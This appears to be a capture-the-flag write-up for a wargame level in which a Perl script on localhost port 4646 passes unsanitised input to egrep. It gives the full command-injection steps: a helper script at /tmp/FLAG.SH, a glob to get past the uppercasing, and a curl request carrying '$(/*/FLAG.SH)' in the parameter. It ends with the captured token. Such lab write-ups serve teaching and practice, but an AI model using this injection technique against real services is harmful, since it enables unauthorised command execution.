In this level we have a perl script

It's running locally on port 4646.

It needs an argument, and we need to exploit this line with egrep :

egrep "^$xx" /tmp/xd 2>$1;

Trying to run the script locally we can understand that it needs to get a capital letter value to x.

We tried to give x the value of getflag, or sh but the VM keep crashing or don't have the right to launch getflag.
We can try to give a bash script as an argument and then redirect getflag in a tmp file in it.
We need to give just the filename as argument for the egrep to execute correctly

Let's try that

echo "getflag > /tmp/flag" > /tmp/flag.sh

Let's get the right to execute it :

chmod +x /tmp/flag.sh

And rename it, because we need it in capital letters

mv /tmp/flag.sh /tmp/FLAG.SH

And then we can give it as parameter

perl level12 x='/*/FLAG.SH'

Looks like it's not working. Hum. How can we execute this script with the good right ?
Curl ! 

Let's try that, we know that the script is running on localhost on port 4646

curl '127.0.0.1:4646?x=$(/*/FLAG.SH)'

Our script is supposed to redirect the getflag return in /tmp/flag so let's open it :

cat /tmp/flag 

Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr

